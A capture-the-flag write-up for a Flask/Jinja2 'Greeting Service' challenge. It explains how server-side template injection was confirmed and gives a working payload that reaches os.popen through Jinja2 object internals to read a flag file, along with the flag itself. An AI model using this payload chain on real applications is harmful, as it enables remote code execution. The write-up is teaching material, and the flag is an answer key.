# Templates 1

## Challenge Info
- **Category**: Web (SSTI)
- **Remote**: `http://chall.0xfun.org:5881`
- **Stack**: Flask (Werkzeug/2.3.7, Python/3.11.14, Jinja2)
- **Flag**: `0xfun{Server_Side_Template_Injection_Awesome}`

## Analysis
"Greeting Service" - a form that takes a name and renders it. The hint is "Server Side Rendering" = SSTI.

Server header reveals **Werkzeug + Python** = Flask with Jinja2 templates.

## Vulnerability
**Server-Side Template Injection (SSTI)** - user input is rendered directly in a Jinja2 template without sanitization (likely using `render_template_string` with user input).

## Exploitation

### 1. Confirm SSTI
```
POST / name={{7*7}} → 49
```

### 2. RCE via Jinja2
```
{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat /app/flag.txt").read()}}
```

Chain: `self` → `__init__` → `__globals__` → `__builtins__` → `__import__("os")` → `popen()` → RCE

## Key Lessons
1. "Server Side Rendering" + "Templates" = SSTI
2. Jinja2 SSTI: `self.__init__.__globals__.__builtins__` gives access to `__import__` for arbitrary module loading
